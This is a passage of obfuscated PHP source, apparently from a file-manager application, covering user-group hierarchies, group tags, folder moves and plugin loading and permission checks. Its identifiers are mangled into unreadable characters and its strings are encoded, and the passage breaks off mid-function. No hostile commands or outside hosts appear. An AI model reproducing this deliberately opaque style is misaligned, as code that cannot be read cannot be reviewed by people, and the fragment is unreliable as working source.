$­‚›Ğø‰[$º¹áÀ[420]]); $­‚›Ğø‰[$º¹áÀ[420]] = array_unique_by_key($ÜñÚ°ø›, $º¹áÀ[1952]); $­‚›Ğø‰[$º¹áÀ[417]][$º¹áÀ[418]] = count($­‚›Ğø‰[$º¹áÀ[420]]); $­‚›Ğø‰[$º¹áÀ[417]][$º¹áÀ[419]] = ceil($­‚›Ğø‰[$º¹áÀ[417]][$º¹áÀ[418]] / $­‚›Ğø‰[$º¹áÀ[417]][$º¹áÀ[414]]); } $this->_listDataApply($­‚›Ğø‰[$º¹áÀ[420]]); return $­‚›Ğø‰; } protected function groupChildrenAll($âê‰†ş€) { $ºù¨¯² =& $_SERVER[³à¼î¯á]; if (!$âê‰†ş€) { return !1; } if (!is_array($âê‰†ş€)) { $âê‰†ş€ = array($âê‰†ş€); } $ıó—Å¹† = $âê‰†ş€; foreach ($âê‰†ş€ as $äÆÖçªÊ) { $†‹—ã¼İ = $this->getInfoSimple($äÆÖçªÊ); $„§‹ÛòÂ = array($ºù¨¯²[560] => array($ºù¨¯²[434], $†‹—ã¼İ[$ºù¨¯²[560]] . $äÆÖçªÊ . $ºù¨¯²[588])); $áÔº–± = $this->field($ºù¨¯²[1952])->where($„§‹ÛòÂ)->select(); $ıó—Å¹† = array_merge($ıó—Å¹†, array_to_keyvalue($áÔº–±, $ºù¨¯²[12], $ºù¨¯²[1952])); } return array_unique($ıó—Å¹†); } private function _searchFromMeta($ƒ²Ê”ë›, $—ŞÉõÍ–, $ùŒ÷¤ë, $“È‡Ù›Ò) { $øÆÂ‡â =& $_SERVER[³à¼î¯á]; $—ŞÉõÍ– = strtolower($—ŞÉõÍ–); $®ıÉñÜä = array($øÆÂ‡â[97] => $ƒ²Ê”ë›, $øÆÂ‡â[425] => array($øÆÂ‡â[434], "\x25{$—ŞÉõÍ–}\45")); $®ıÉñÜä = $this->parseWhereLike($®ıÉñÜä); if ($“È‡Ù›Ò) { $®ıÉñÜä[$øÆÂ‡â[1952]] = array($øÆÂ‡â[7], $“È‡Ù›Ò); } $È€²êÃ¿ = Model($øÆÂ‡â[2056])->where($®ıÉñÜä)->limit($ùŒ÷¤ë)->select(); if (!$È€²êÃ¿) { return array(); } $È€²êÃ¿ = array_to_keyvalue($È€²êÃ¿, $øÆÂ‡â[12], $øÆÂ‡â[1952]); $üÚÄ’õ¦ = $this->where(array($øÆÂ‡â[2045] => array($øÆÂ‡â[7], $È€²êÃ¿)))->select(); if (!$üÚÄ’õ¦) { return array(); } return $üÚÄ’õ¦; } protected function _listDataApplyItem($Ö½à®·ø) { $Œèáî¸Ñ = array($Ö½à®·ø); $this->_listDataApply($Œèáî¸Ñ); return $Œèáî¸Ñ[0]; } protected function _listDataApply(&$¼µ“ıÇş) { $¿­õù«Ã =& $_SERVER[³à¼î¯á]; if (!$¼µ“ıÇş) { return; } $ÇÌºıè¥ = array_to_keyvalue($¼µ“ıÇş, $¿­õù«Ã[12], $¿­õù«Ã[1952]); $this->_listAppendChildren($¼µ“ıÇş); $this->_listAppendChildrenMember($¼µ“ıÇş); $this->_listAppendMeta($¼µ“ıÇş, $ÇÌºıè¥); $this->_listAppendParent($¼µ“ıÇş); $this->_listAppendSourceRoot($¼µ“ıÇş, $ÇÌºıè¥); } private function _listAppendChildren(&$©Ù÷²¡ß) { $ù—¹™¶ =& $_SERVER[³à¼î¯á]; $‹â±–°ˆ = array_to_keyvalue($©Ù÷²¡ß, $ù—¹™¶[12], $ù—¹™¶[1952]); $ú·üè¬ = array($ù—¹™¶[183] => array($ù—¹™¶[7], $‹â±–°ˆ)); $½§—Œü½ = array($ù—¹™¶[183], $ù—¹™¶[2057] => $ù—¹™¶[541]); $´ß‹¹×Ï = $this->field($½§—Œü½)->where($ú·üè¬)->group($ù—¹™¶[183])->select(); $ıäÃˆ•Œ = array_to_keyvalue($´ß‹¹×Ï, $ù—¹™¶[183], $ù—¹™¶[541]); foreach ($©Ù÷²¡ß as &$ŸÁ—ìÀ) { $øÊ÷­ëĞ = $ŸÁ—ìÀ[$ù—¹™¶[1952]]; $ŸÁ—ìÀ[$ù—¹™¶[2058]] = isset($ıäÃˆ•Œ[$øÊ÷­ëĞ]) ? intval($ıäÃˆ•Œ[$øÊ÷­ëĞ]) : !1; } unset($ŸÁ—ìÀ); } private function _listAppendChildrenMember(&$–ÌÙ™˜¼) { $íÃ£ğË =& $_SERVER[³à¼î¯á]; $ñÈ¥Ïã = array_to_keyvalue($–ÌÙ™˜¼, $íÃ£ğË[12], $íÃ£ğË[1952]); $¯æ¿¦Ç = array($íÃ£ğË[1952] => array($íÃ£ğË[7], $ñÈ¥Ïã)); $ê±–ôÓ§ = array($íÃ£ğË[1952], $íÃ£ğË[2057] => $íÃ£ğË[541]); $–“Ç£ûÓ = Model($íÃ£ğË[2047])->field($ê±–ôÓ§)->where($¯æ¿¦Ç)->group($íÃ£ğË[1952])->select(); $£¸„Ä«– = array_to_keyvalue($–“Ç£ûÓ, $íÃ£ğË[1952], $íÃ£ğË[541]); foreach ($–ÌÙ™˜¼ as &$¦‡¶Ğ´ı) { $äëÃ» = $¦‡¶Ğ´ı[$íÃ£ğË[1952]]; $¦‡¶Ğ´ı[$íÃ£ğË[2059]] = isset($£¸„Ä«–[$äëÃ»]) ? intval($£¸„Ä«–[$äëÃ»]) : !1; } unset($¦‡¶Ğ´ı); } private function _listAppendMeta(&$Ÿ©¾äºÑ, $ÁÁà¿à) { $‰ÔšËÛå =& $_SERVER[³à¼î¯á]; $¦–’±…µ = array($‰ÔšËÛå[1952] => array($‰ÔšËÛå[7], $ÁÁà¿à)); $¶ğ·ëÃş = Model($‰ÔšËÛå[2046])->where($¦–’±…µ)->select(); $¶ğ·ëÃş = array_to_keyvalue_group($¶ğ·ëÃş, $‰ÔšËÛå[1952]); foreach ($¶ğ·ëÃş as &$üÄïì ) { $üÄïì  = array_to_keyvalue($üÄïì , $‰ÔšËÛå[97], $‰ÔšËÛå[425]); } unset($üÄïì ); foreach ($Ÿ©¾äºÑ as &$Š¥æñ©) { $Š¥æñ©[$‰ÔšËÛå[514]] = array(); if (isset($¶ğ·ëÃş[$Š¥æñ©[$‰ÔšËÛå[1952]]])) { $Š¥æñ©[$‰ÔšËÛå[514]] = $¶ğ·ëÃş[$Š¥æñ©[$‰ÔšËÛå[1952]]]; } } unset($Š¥æñ©); } protected function parentLevelArray($ÑÎ¿£î¾) { $Óô„ê’£ =& $_SERVER[³à¼î¯á]; $ÑÎ¿£î¾ = explode($Óô„ê’£[50], trim($ÑÎ¿£î¾, $Óô„ê’£[50])); $ÑÎ¿£î¾ = array_remove_value($ÑÎ¿£î¾, $Óô„ê’£[219]); return $ÑÎ¿£î¾; } protected function parentInGroup($Öô÷ŞÅÑ, $™±”Ûğ) { $”£ŒØ± =& $_SERVER[³à¼î¯á]; $¾Ñã‡Û¼ = $this->getInfoSimple($Öô÷ŞÅÑ); if (!$¾Ñã‡Û¼) { return !0; } $ß¥—ª¦º = $this->parentLevelArray($¾Ñã‡Û¼[$”£ŒØ±[560]]); $ß¥—ª¦º[] = $Öô÷ŞÅÑ; foreach ($ß¥—ª¦º as $Öô÷ŞÅÑ) { if (in_array($Öô÷ŞÅÑ . $”£ŒØ±[12], $™±”Ûğ)) { return !0; } } return !1; } private function _listAppendParent(&$É‰¸¤ÄŒ) { $ñ¸£ÓåÈ =& $_SERVER[³à¼î¯á]; $Éó¶åŒ§ = array(); foreach ($É‰¸¤ÄŒ as &$Ë²‡È«ˆ) { $Éó¶åŒ§[$Ë²‡È«ˆ[$ñ¸£ÓåÈ[1952]]] = $Ë²‡È«ˆ[$ñ¸£ÓåÈ[32]]; $ãÍòä°£ = $this->parentLevelArray($Ë²‡È«ˆ[$ñ¸£ÓåÈ[560]]); foreach ($ãÍòä°£ as $Š¶Îıœ°) { if (!isset($Éó¶åŒ§[$Š¶Îıœ°])) { $Éó¶åŒ§[$Š¶Îıœ°] = 0; } } } unset($Ë²‡È«ˆ); foreach ($Éó¶åŒ§ as $‚ß—ºŠ× => $—ù¼³Û¢) { if ($—ù¼³Û¢) { continue; } $¼ÆÅ÷ô = $this->getInfoSimple($‚ß—ºŠ×); $Éó¶åŒ§[$‚ß—ºŠ×] = $¼ÆÅ÷ô[$ñ¸£ÓåÈ[32]]; } $ƒ‰¡„ğª = $GLOBALS[$ñ¸£ÓåÈ[6]][$ñ¸£ÓåÈ[92]][$ñ¸£ÓåÈ[2060]]; if (KodUser::isRoot()) { $ƒ‰¡„ğª = !1; } foreach ($É‰¸¤ÄŒ as &$Ë²‡È«ˆ) { $ãÍòä°£ = $this->parentLevelArray($Ë²‡È«ˆ[$ñ¸£ÓåÈ[560]]); $¡Ìµö•° = $ñ¸£ÓåÈ[12]; foreach ($ãÍòä°£ as $‚ß—ºŠ× => $Š¶Îıœ°) { if ($ƒ‰¡„ğª && $‚ß—ºŠ× == 0) { continue; } $¡Ìµö•° .= $Éó¶åŒ§[$Š¶Îıœ°] . $ñ¸£ÓåÈ[8]; } if ($ãÍòä°£) { $¡Ìµö•° .= $Ë²‡È«ˆ[$ñ¸£ÓåÈ[32]]; } $Ë²‡È«ˆ[$ñ¸£ÓåÈ[565]] = str_replace($ñ¸£ÓåÈ[568], $ñ¸£ÓåÈ[8], $¡Ìµö•°); } unset($Ë²‡È«ˆ); } private function _listAppendSourceRoot(&$¾¡ †é, $œÆ¿ñÏ¹) { $ôû¹›“õ =& $_SERVER[³à¼î¯á]; $öüÌáèé = Model($ôû¹›“õ[869])->listSourceRoot(SourceModel::TYPE_GROUP, $œÆ¿ñÏ¹); $öüÌáèé = array_to_keyvalue($öüÌáèé, $ôû¹›“õ[545]); $öüÌáèé = array_remove_key($öüÌáèé, $ôû¹›“õ[545]); foreach ($¾¡ †é as &$Œ´¶ÌÙ) { $Œ´¶ÌÙ[$ôû¹›“õ[90]] = $öüÌáèé[$Œ´¶ÌÙ[$ôû¹›“õ[1952]]] ? $öüÌáèé[$Œ´¶ÌÙ[$ôû¹›“õ[1952]]] : array(); } unset($Œ´¶ÌÙ); } protected function groupMerge($œÂÏòˆ·) { $œÂÏòˆ· = array_values(array_unique($œÂÏòˆ·)); $‘š¾¡ìï = array(); for ($”Ğéİµ = 0; $”Ğéİµ < count($œÂÏòˆ·); $”Ğéİµ++) { $ÑÓíĞ›É = !1; for ($»Á¦ëŒ¿ = 0; $»Á¦ëŒ¿ < count($œÂÏòˆ·); $»Á¦ëŒ¿++) { if ($”Ğéİµ == $»Á¦ëŒ¿) { continue; } if ($this->isParentOf($œÂÏòˆ·[$»Á¦ëŒ¿], $œÂÏòˆ·[$”Ğéİµ])) { $ÑÓíĞ›É = !0; break; } } if (!$ÑÓíĞ›É) { $‘š¾¡ìï[] = $œÂÏòˆ·[$”Ğéİµ]; } } return $‘š¾¡ìï; } protected function isParentOf($ØÈ–‚íÊ, $´Äç•üÊ) { $ÉÁéã•ú =& $_SERVER[³à¼î¯á]; if (!$ØÈ–‚íÊ || !$´Äç•üÊ || $ØÈ–‚íÊ == $´Äç•üÊ) { return !1; } $‹Òñ­’û = $this->getInfoSimple($ØÈ–‚íÊ); $…îùíı© = $this->getInfoSimple($´Äç•üÊ); $È´²½£¢ = $‹Òñ­’û[$ÉÁéã•ú[560]] . $ØÈ–‚íÊ . $ÉÁéã•ú[50]; if (substr($…îùíı©[$ÉÁéã•ú[560]], 0, strlen($È´²½£¢)) == $È´²½£¢) { return !0; } return !1; } public function groupShowRoot($‡Ş¤‡é¬, $Ñæ’ÍÕê = false) { $ûô¶Ñ’€ =& $_SERVER[³à¼î¯á]; $ÎÖöşÈÇ = $this->getInfo($‡Ş¤‡é¬); if (!$ÎÖöşÈÇ) { return array(); } $ı÷â¡Ÿ = $this->parentLevelArray($ÎÖöşÈÇ[$ûô¶Ñ’€[560]]); $™ÃêÅà = array($‡Ş¤‡é¬); if (count($ı÷â¡Ÿ) == 0) { return $™ÃêÅà; } if ($Ñæ’ÍÕê && count($ı÷â¡Ÿ) == 1) { return $™ÃêÅà; } if (!$ÎÖöşÈÇ[$ûô¶Ñ’€[514]] || !isset($ÎÖöşÈÇ[$ûô¶Ñ’€[514]][$ûô¶Ñ’€[2043]]) || $ÎÖöşÈÇ[$ûô¶Ñ’€[514]][$ûô¶Ñ’€[2043]] == $ûô¶Ñ’€[2008]) { return $this->groupShowRoot($ı÷â¡Ÿ[count($ı÷â¡Ÿ) - 1], $Ñæ’ÍÕê); } if ($ÎÖöşÈÇ[$ûô¶Ñ’€[514]][$ûô¶Ñ’€[2043]] == $ûô¶Ñ’€[408]) { $´ÀŸŞ‘ = explode($ûô¶Ñ’€[50], $ÎÖöşÈÇ[$ûô¶Ñ’€[514]][$ûô¶Ñ’€[2044]]); if ($´ÀŸŞ‘) { $™ÃêÅà = array_merge($™ÃêÅà, $´ÀŸŞ‘); } } return $™ÃêÅà; } protected function resetParentLevel() { $”…‘ôæƒ =& $_SERVER[³à¼î¯á]; $¡ÜÓ¤ä = $”…‘ôæƒ[1952]; $Ó­úÌ ô = $this->select(); $Ó­úÌ ô = array_to_keyvalue($Ó­úÌ ô, $¡ÜÓ¤ä); foreach ($Ó­úÌ ô as $„½²éº) { $‡½ôòÀü = $„½²éº; $â®ºœô = array(); while ($‡½ôòÀü[$”…‘ôæƒ[183]] != 0) { $â®ºœô[] = $‡½ôòÀü[$”…‘ôæƒ[183]]; $‡½ôòÀü = $Ó­úÌ ô[$‡½ôòÀü[$”…‘ôæƒ[183]]]; } $â®ºœô[] = 0; $â®ºœô = $”…‘ôæƒ[50] . implode($”…‘ôæƒ[50], array_reverse($â®ºœô)) . $”…‘ôæƒ[50]; $this->setNamePinyin($„½²éº[$¡ÜÓ¤ä], $„½²éº[$”…‘ôæƒ[32]]); $this->where(array($¡ÜÓ¤ä => $„½²éº[$¡ÜÓ¤ä]))->save(array($”…‘ôæƒ[627] => $â®ºœô)); } return $Ó­úÌ ô; } public function groupNameAuto($Ïâç•, $×‘½İŠä) { $¥Ùç×Ğ» =& $_SERVER[³à¼î¯á]; $ëèïç  = $this->where(array($¥Ùç×Ğ»[452] => $Ïâç•))->getField($¥Ùç×Ğ»[32], !0); if (!$ëèïç  || !in_array($×‘½İŠä, $ëèïç )) { return $×‘½İŠä; } for ($œå¢çÊÛ = 1; $œå¢çÊÛ <= count($ëèïç ) + 1; $œå¢çÊÛ++) { $çò÷Û©ú = $×‘½İŠä . "\x28{$œå¢çÊÛ}\x29"; if (!in_array($çò÷Û©ú, $ëèïç )) { return $çò÷Û©ú; } } } public function groupSwitch($ñûÀµ—, $‘ßÛÉÊ) { $Üúùı“ =& $_SERVER[³à¼î¯á]; $Ôªİà‚× = array($Üúùı“[1952] => array($Üúùı“[7], array($ñûÀµ—, $‘ßÛÉÊ))); $ıÅìë¼‰ = $this->where($Ôªİà‚×)->select(); $ıÅìë¼‰ = array_to_keyvalue($ıÅìë¼‰, $Üúùı“[1952]); if (!isset($ıÅìë¼‰[$ñûÀµ—]) || !isset($ıÅìë¼‰[$‘ßÛÉÊ]) || $ıÅìë¼‰[$ñûÀµ—][$Üúùı“[183]] == 0) { return !1; } $Ôªİà‚× = array($Üúùı“[1952] => $ñûÀµ—); $ş¢÷éû = Model($Üúùı“[2047])->where($Ôªİà‚×)->select(); if (!$ş¢÷éû) { $ş¢÷éû = array(); } foreach ($ş¢÷éû as $°â¯ëœã) { $Ë·¶ãÒ› = $°â¯ëœã[$Üúùı“[1753]]; $Ôªİà‚× = array($Üúùı“[1753] => $Ë·¶ãÒ›, $Üúùı“[1952] => $‘ßÛÉÊ); $øıƒ´Ã¹ = Model($Üúùı“[2047])->where($Ôªİà‚×)->find(); if (!$øıƒ´Ã¹) { $ãƒ ¦ä = array($‘ßÛÉÊ => $°â¯ëœã[$Üúùı“[2061]]); Model($Üúùı“[574])->userGroupAdd($Ë·¶ãÒ›, $ãƒ ¦ä); } Model($Üúùı“[574])->userGroupRemove($Ë·¶ãÒ›, $ñûÀµ—); } $Ôªİà‚× = array($Üúùı“[181] => 2, $Üúùı“[183] => 0, $Üúùı“[460] => 1, $Üúùı“[545] => array($Üúùı“[7], array($ñûÀµ—, $‘ßÛÉÊ))); $Ò‚ÖŒÒå = Model($Üúùı“[869])->where($Ôªİà‚×)->field($Üúùı“[2062])->select(); $Ò‚ÖŒÒå = array_to_keyvalue($Ò‚ÖŒÒå, $Üúùı“[545], $Üúùı“[184]); $€“³ü = !empty($Ò‚ÖŒÒå[$ñûÀµ—]) ? $Ò‚ÖŒÒå[$ñûÀµ—] : !1; if ($€“³ü) { if (!$Ò‚ÖŒÒå[$‘ßÛÉÊ]) { $Ò‚ÖŒÒå[$‘ßÛÉÊ] = Model($Üúùı“[869])->groupRootAdd($‘ßÛÉÊ); } $¤Ù©’‚¾ = $Ò‚ÖŒÒå[$‘ßÛÉÊ]; $Ôªİà‚× = array($Üúùı“[183] => $€“³ü); $Ò‚ÖŒÒå = Model($Üúùı“[869])->where($Ôªİà‚×)->field($Üúùı“[2063])->select(); if (!$Ò‚ÖŒÒå) { $Ò‚ÖŒÒå = array(); } Model($Üúùı“[869])->moveClearAuth = !1; foreach ($Ò‚ÖŒÒå as $º”é£ŞÓ) { $‰øçßƒÍ = $º”é£ŞÓ[$Üúùı“[460]] == $Üúùı“[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Üúùı“[869])->move($º”é£ŞÓ[$Üúùı“[184]], $¤Ù©’‚¾, $‰øçßƒÍ); } Model($Üúùı“[869])->moveClearAuth = !0; $Ôªİà‚× = array($Üúùı“[181] => 2, $Üúùı“[545] => $ñûÀµ—); $ÚÑæÅ§Ú = array($Üúùı“[545] => $‘ßÛÉÊ); Model($Üúùı“[2064])->where($Ôªİà‚×)->save($ÚÑæÅ§Ú); Model($Üúùı“[2065])->where($Ôªİà‚×)->save($ÚÑæÅ§Ú); } $this->_changeChildLevel($ıÅìë¼‰[$ñûÀµ—], $ıÅìë¼‰[$‘ßÛÉÊ], !0); $this->where(array($Üúùı“[183] => $ñûÀµ—))->save(array($Üúùı“[183] => $‘ßÛÉÊ)); $this->_clearChildrenCache($ıÅìë¼‰[$‘ßÛÉÊ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\141\166"; protected function cacheFunctionAlias($¶‰„Ûü) { $äÈÎÌÌ¶ =& $_SERVER[³à¼î¯á]; return array($äÈÎÌÌ¶[2066] => array($¶‰„Ûü[0], $äÈÎÌÌ¶[2067]), $äÈÎÌÌ¶[2068] => array($¶‰„Ûü[0], $äÈÎÌÌ¶[2069])); } protected function get($óúû˜„) { $•åˆô®‡ =& $_SERVER[³à¼î¯á]; $Ä°£çƒ = Model($•åˆô®‡[561])->metaGet($óúû˜„, $•åˆô®‡[2070]); $¤­¹Òª‡ = json_decode($Ä°£çƒ, !0); return $¤­¹Òª‡ ? $¤­¹Òª‡ : array($•åˆô®‡[2071] => $•åˆô®‡[91], $•åˆô®‡[420] => array()); } protected function set($¤Ğì¢‡¸, $‚¿ı‡ ) { $–¡¿¥ûÒ =& $_SERVER[³à¼î¯á]; $‚¿ı‡  = $‚¿ı‡  ? $‚¿ı‡  : array($–¡¿¥ûÒ[2071] => $–¡¿¥ûÒ[91], $–¡¿¥ûÒ[420] => array()); return Model($–¡¿¥ûÒ[561])->metaSet($¤Ğì¢‡¸, $–¡¿¥ûÒ[2070], json_encode($‚¿ı‡ )); } protected function getByTagID($ß£Ïô», $–‹‚£ñÄ) { $ùÚ¼ØäÙ =& $_SERVER[³à¼î¯á]; if (!$ß£Ïô» || !$–‹‚£ñÄ) { return !1; } if (!Model($ùÚ¼ØäÙ[561])->getInfoSimple($ß£Ïô»)) { return !1; } $©Ğî—¦ = $this->get($ß£Ïô»); if (!$©Ğî—¦ || !isset($©Ğî—¦[$ùÚ¼ØäÙ[420]])) { return !1; } $ÁıŒÚ›Í = array_find_by_field($©Ğî—¦[$ùÚ¼ØäÙ[420]], $ùÚ¼ØäÙ[450], $–‹‚£ñÄ); return is_array($ÁıŒÚ›Í) ? $ÁıŒÚ›Í : !1; } public function listSource($±€È»å, $£¯÷è²) { $à¢öîöÒ =& $_SERVER[³à¼î¯á]; if ($£¯÷è² && !is_array($£¯÷è²)) { $£¯÷è² = array($£¯÷è²); } $ñ…ØÛ± = $this->listData($±€È»å); $–¥ÄÑéá = array(); foreach ($ñ…ØÛ± as $¿Ü€‰¸£) { $“ˆë‚Ğ¹ = $¿Ü€‰¸£[$à¢öîöÒ[87]]; if (!$“ˆë‚Ğ¹) { continue; } if (!isset($–¥ÄÑéá[$“ˆë‚Ğ¹])) { $–¥ÄÑéá[$“ˆë‚Ğ¹] = array(); } $–¥ÄÑéá[$“ˆë‚Ğ¹][] = $¿Ü€‰¸£[$à¢öîöÒ[475]]; } $ñ©»Ëá˜ = array(); foreach ($–¥ÄÑéá as $İîâµ°ü => $¼‡¿ï¢½) { $›İ¬…£¤ = !0; if (!$£¯÷è²) { $ñ©»Ëá˜[] = $İîâµ°ü; continue; } foreach ($£¯÷è² as $ÖôäÊÑŠ) { if (!in_array($ÖôäÊÑŠ, $¼‡¿ï¢½)) { $›İ¬…£¤ = !1; break; } } if ($›İ¬…£¤) { $ñ©»Ëá˜[] = $İîâµ°ü; } } if (!$ñ©»Ëá˜) { return array(); } $—ø˜‰û× = array($à¢öîöÒ[466] => array($à¢öîöÒ[467], $ñ©»Ëá˜), $à¢öîöÒ[545] => $±€È»å, $à¢öîöÒ[181] => SourceModel::TYPE_GROUP); $¹¤†çÔŠ = Model($à¢öîöÒ[1388])->listSource($—ø˜‰û×); if (!$¹¤†çÔŠ || count($ñ©»Ëá˜) == $¹¤†çÔŠ[$à¢öîöÒ[417]][$à¢öîöÒ[418]]) { return $¹¤†çÔŠ; } $ìÉøÃ á = array(); $Õ¹’€Áá = array_to_keyvalue($¹¤†çÔŠ[$à¢öîöÒ[85]], $à¢öîöÒ[12], $à¢öîöÒ[184]); $ö²šÉ¤Í = array_to_keyvalue($¹¤†çÔŠ[$à¢öîöÒ[86]], $à¢öîöÒ[12], $à¢öîöÒ[184]); $ß‹Òú»§ = array_merge($ö²šÉ¤Í, $Õ¹’€Áá); foreach ($ñ©»Ëá˜ as $“ˆë‚Ğ¹) { if (!in_array($“ˆë‚Ğ¹, $ß‹Òú»§)) { $ìÉøÃ á[] = $“ˆë‚Ğ¹; } } if ($ìÉøÃ á) { $this->removeBySource($±€È»å, $ìÉøÃ á); } return $¹¤†çÔŠ; } protected function listData($ÇæÉ¾Š®) { $Á—÷÷ =& $_SERVER[³à¼î¯á]; $³‘Ù€´Ô = array($Á—÷÷[1744] => 0, $Á—÷÷[533] => array($Á—÷÷[2072], 0), $Á—÷÷[471] => $Á—÷÷[2073] . $ÇæÉ¾Š®); $Õß ÏÆÓ = $Á—÷÷[2074]; $«¡ŞÁüæ = $this->field($Õß ÏÆÓ)->where($³‘Ù€´Ô)->order($Á—÷÷[2075])->select(); return $«¡ŞÁüæ ? $«¡ŞÁüæ : array(); } protected function addToTag($¤òğ–ì«, $¼ƒ¨¼ƒ, $³¨¹ƒ²) { $ˆ÷†ˆŸó =& $_SERVER[³à¼î¯á]; if (!$this->getByTagID($¤òğ–ì«, $³¨¹ƒ²) || !$¼ƒ¨¼ƒ) { return !1; } if (!Model($ˆ÷†ˆŸó[869])->pathInfo($¼ƒ¨¼ƒ)) { return !1; } $Ø°ğéÀ“ = array($ˆ÷†ˆŸó[1744] => 0, $ˆ÷†ˆŸó[533] => $³¨¹ƒ², $ˆ÷†ˆŸó[470] => $¼ƒ¨¼ƒ, $ˆ÷†ˆŸó[471] => $ˆ÷†ˆŸó[2076] . $¤òğ–ì«, $ˆ÷†ˆŸó[469] => $ˆ÷†ˆŸó[12], $ˆ÷†ˆŸó[1956] => 0); if ($this->where($Ø°ğéÀ“)->find()) { return !1; } return $this->add($Ø°ğéÀ“); } protected function removeFromTag($ë¹çÓ¾ù, $ÕÖ½««ã, $ÊäĞ¨ƒä) { $ßäğê =& $_SERVER[³à¼î¯á]; if (!$this->getByTagID($ë¹çÓ¾ù, $ÊäĞ¨ƒä) || !$ÕÖ½««ã) { return !1; } if (is_array($ÕÖ½««ã)) { $ÕÖ½««ã = array($ßäğê[7], $ÕÖ½««ã); } $öù‰³üˆ = array($ßäğê[1744] => 0, $ßäğê[533] => $ÊäĞ¨ƒä, $ßäğê[471] => $ßäğê[2076] . $ë¹çÓ¾ù, $ßäğê[470] => $ÕÖ½««ã); return $this->where($öù‰³üˆ)->delete(); } protected function removeByTag($“Æ©’ˆÈ, $€£ÁÕŸ) { $ºƒèñãæ =& $_SERVER[³à¼î¯á]; if (!$this->getByTagID($“Æ©’ˆÈ, $€£ÁÕŸ)) { return !1; } $°¶åí‚Ú = array($ºƒèñãæ[1744] => 0, $ºƒèñãæ[533] => $€£ÁÕŸ, $ºƒèñãæ[471] => $ºƒèñãæ[2076] . $“Æ©’ˆÈ); return $this->where($°¶åí‚Ú)->delete(); } protected function removeBySource($±çı†ì, $ÏÔç¢Ï¶) { $æ¢î°º =& $_SERVER[³à¼î¯á]; if (!$±çı†ì || !$ÏÔç¢Ï¶) { return !1; } if (is_array($ÏÔç¢Ï¶)) { $ÏÔç¢Ï¶ = array($æ¢î°º[7], $ÏÔç¢Ï¶); } $¤ÚŞÂÄ¤ = array($æ¢î°º[1744] => 0, $æ¢î°º[470] => $ÏÔç¢Ï¶, $æ¢î°º[533] => array($æ¢î°º[1064], 0), $æ¢î°º[471] => $æ¢î°º[2076] . $±çı†ì); return $this->where($¤ÚŞÂÄ¤)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\160\x6c\165\x67\151\x6e\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\163\x74\141\164\165\x73", "\x72\145\x67\151\x65\163\x74", "\143\x6f\156\146\x69\147"); public function loadList($ß¹éÇŞñ = false) { $‘â¨÷ƒ­ = array_to_keyvalue($this->listData(), $_SERVER[³à¼î¯á][32]); if ($ß¹éÇŞñ) { return $‘â¨÷ƒ­[$ß¹éÇŞñ]; } return $‘â¨÷ƒ­; } public function init() { $£¨ı³– =& $_SERVER[³à¼î¯á]; Hook::trigger($£¨ı³–[2077]); $ú¬‘‰ï¼ = $this->loadPluginList(); foreach ($ú¬‘‰ï¼ as $íĞ¹¼õ¥ => $óé…£€ù) { $”œûÉû = $this->appAllow($íĞ¹¼õ¥, $óé…£€ù); if (!$”œûÉû) { continue; } foreach ($óé…£€ù[$£¨ı³–[2078]] as $åãš°Ã => $Ê¥´à‡İ) { Hook::bind($åãš°Ã, $Ê¥´à‡İ); } } Hook::trigger($£¨ı³–[2079]); Hook::trigger(ACTION); } public function appAllow($‹ã™ãÉé, $€şŞ§åà, $åëŠŞØ” = true) { $œ¡í­‚Ê =& $_SERVER[³à¼î¯á]; $±ø¿”Ú = PLUGIN_DIR . $‹ã™ãÉé . $œ¡í­‚Ê[2080]; if (!is_array($€şŞ§åà) || !is_array($€şŞ§åà[$œ¡í­‚Ê[2078]]) || $€şŞ§åà[$œ¡í­‚Ê[795]] != 1 || !is_file($±ø¿”Ú)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$œ¡í­‚Ê[6]][$œ¡í­‚Ê[2081]] || !$GLOBALS[$œ¡í­‚Ê[6]][$œ¡í­‚Ê[2082]]) { return !0; } $ªà¡üş  = explode($œ¡í­‚Ê[50], strtolower($GLOBALS[$œ¡í­‚Ê[6]][$œ¡í­‚Ê[2082]])); return in_array(strtolower($‹ã™ãÉé), $ªà¡üş ) ? !1 : !0; } if ($åëŠŞØ” && !Action($œ¡í­‚Ê[2083])->checkAuth($‹ã™ãÉé)) { return !1; } return !0; } public function unInstall($ˆ¼ÃÑØ¤) { $İÍ‹ú½ş =& $_SERVER[³à¼î¯á]; $ª®¥µÜ = $this->loadList($ˆ¼ÃÑØ¤); if (file_exists(PLUGIN_DIR . $ˆ¼ÃÑØ¤)) { Hook::apply($ˆ¼ÃÑØ¤ . $İÍ‹ú½ş[2084]); } $this->remove($ª®¥µÜ[$İÍ‹ú½ş[450]]); } public function changeStatus($‡ãèœÑ½, $ØÚÇ¼í) { $Ê±«İ— =& $_SERVER[³à¼î¯á]; $­’ÊşşÃ = $this->loadList($‡ãèœÑ½); if ($ØÚÇ¼í) { Hook::apply($‡ãèœÑ½ . $Ê±«İ—[2085]); } $this->update($­’ÊşşÃ[$Ê±«İ—[450]], array($Ê±«İ—[2086] => $ØÚÇ¼í)); } public function appRegist($Ö”¼âı®, $Çæ ±àÆ) { $˜ş˜êø =& $_SERVER[³à¼î¯á]; $ÓŸ›ÂĞÑ = $this->loadList($Ö”¼âı®); if ($ÓŸ›ÂĞÑ) { $this->update($ÓŸ›ÂĞÑ[$˜ş˜êø[450]], array($˜ş˜êø[2078] => $Çæ ±àÆ)); } else { $äãè²‘¶ = array($˜ş˜êø[32] => $Ö”¼âı®, $˜ş˜êø[2078] => $Çæ ±àÆ, $˜ş˜êø[795] => 0, $˜ş˜êø[6] => $this->getConfigDefault($Ö”¼âı®)); $this->insert($äãè²‘¶); } } public function getConfigDefault($¼€¨»ß—) { $¿½÷›µ =& $_SERVER[³à¼î¯á]; $Ò¡íøÙĞ = array(); $Ø«®÷Î› = $this->getPackageJson($¼€¨»ß—); if (!$Ø«®÷Î› && is_array($Ø«®÷Î›[$¿½÷›µ[2087]])) { return $Ò¡íøÙĞ; } foreach ($Ø«®÷Î›[$¿½÷›µ[2087]] as $öŞÛ­Øö => $´Ü©Ø£Ä) { if (!isset($´Ü©Ø£Ä[$¿½÷›µ[425]]) || isset($Ò¡íøÙĞ[$öŞÛ­Øö])) { continue; } 